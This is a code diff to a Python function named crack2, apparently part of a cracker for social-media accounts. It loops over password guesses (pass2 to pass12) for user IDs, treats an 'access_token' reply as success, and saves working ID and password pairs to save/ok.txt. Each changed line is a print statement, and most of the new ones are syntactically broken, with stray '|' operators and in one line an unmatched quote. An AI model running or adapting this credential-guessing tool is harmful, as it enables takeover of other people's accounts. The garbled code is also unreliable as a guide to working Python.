@@ -347,7 +347,7 @@ def crack2():
 		                cps.append(uid)
 		            else:
 		                if 'access_token' in d:
-		                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass2 | "+name)
+		                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass2 | +name)
 		                    ok=open("save/ok.txt","a")
 		                    ok.write(uid+" | "+pass2+"\n")
 		                    ok.close()
@@ -364,7 +364,7 @@ def crack2():
 		                        cps.append(uid)
 		                    else:
 		                        if 'access_token' in d:
-		                            print(" \x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass3 | "+name)
+		                            print(" \x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass3 | +name)
 		                            ok=open("save/ok.txt","a")
 		                            ok.write(uid+" | "+pass3+"\n")
 		                            ok.close()
@@ -381,7 +381,7 @@ def crack2():
 		                                cps.append(uid)
 		                            else:
 		                                if 'access_token' in d:
-		                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass4+"\x1b[1;0m")
+		                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass4 | +name")
 		                                    ok=open("save/ok.txt","a")
 		                                    ok.write(uid+" | "+pass4+"\n")
 		                                    ok.close()
@@ -398,7 +398,7 @@ def crack2():
 		                                        cps.append(uid)
 		                                    else:
 		                                        if 'access_token' in d:
-		                                            print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass5+"\x1b[1;0m")
+		                                            print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass5 | +name)
 		                                            ok=open("save/ok.txt","a")
 		                                            ok.write(uid+" | "+pass5+"\n")
 		                                            ok.close()
@@ -415,7 +415,7 @@ def crack2():
 		                                                cps.append(uid)
 		                                            else:
 		                                                if 'access_token' in d:
-		                                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass6+"\x1b[1;0m")
+		                                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass6 | +name)
 		                                                    ok=open("save/ok.txt","a")
 		                                                    ok.write(uid+" | "+pass6+"\n")
 		                                                    ok.close()
@@ -432,7 +432,7 @@ def crack2():
 		                                                        cps.append(uid)
 		                                                    else:
 		                                                        if 'access_token' in d:
-		                                                            print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass7+"\x1b[1;0m")
+		                                                            print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass7 | +name)
 		                                                            ok=open("save/ok.txt","a")
 		                                                            ok.write(uid+" | "+pass7+"\n")
 		                                                            ok.close()
@@ -449,7 +449,7 @@ def crack2():
 		                                                                cps.append(uid)
 		                                                            else:
 		                                                                if 'access_token' in d:
-		                                                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass8+"\x1b[1;0m")
+		                                                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass8 | +name)
 		                                                                    ok=open("save/ok.txt","a")
 		                                                                    ok.write(uid+" | "+pass8+"\n")
 		                                                                    ok.close()
@@ -466,7 +466,7 @@ def crack2():
 		                                                                        cps.append(uid)
 		                                                                    else:
 		                                                                        if 'access_token' in d:
-		                                                                            print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass9+"\x1b[1;0m")
+		                                                                            print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass9 | +name)
 		                                                                            ok=open("save/ok.txt","a")
 		                                                                            ok.write(uid+" | "+pass9+"\n")
 		                                                                            ok.close()
@@ -483,7 +483,7 @@ def crack2():
 		                                                                                cps.append(uid)
 		                                                                            else:
 		                                                                                if 'access_token' in d:
-		                                                                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass10+"\x1b[1;0m")
+		                                                                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass10+ | +name)
 		                                                                                    ok=open("save/ok.txt","a")
 		                                                                                    ok.write(uid+" | "+pass10+"\n")
 		                                                                                    ok.close()
@@ -500,7 +500,7 @@ def crack2():
 		                                                                                        cps.append(uid)
 		                                                                                    else:
 		                                                                                        if 'access_token' in d:
-		                                                                                            print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass11+"\x1b[1;0m")
+		                                                                                            print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass11 | +name)
 		                                                                                            ok=open("save/ok.txt","a")
 		                                                                                            ok.write(uid+" | "+pass11+"\n")
 		                                                                                            ok.close()
@@ -517,7 +517,7 @@ def crack2():
 		                                                                                                cps.append(uid)
 		                                                                                            else:
 		                                                                                                if 'access_token' in d:
-		                                                                                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass12+"\x1b[1;0m")
+		                                                                                                    print("\x1b[1;92m[OK] \033[1;30m"+uid+" | "+pass12 | +name)
 		                                                                                                    ok=open("save/ok.txt","a")
 		                                                                                                    ok.write(uid+" | "+pass12+"\n")
 		                                                                                                    ok.close()
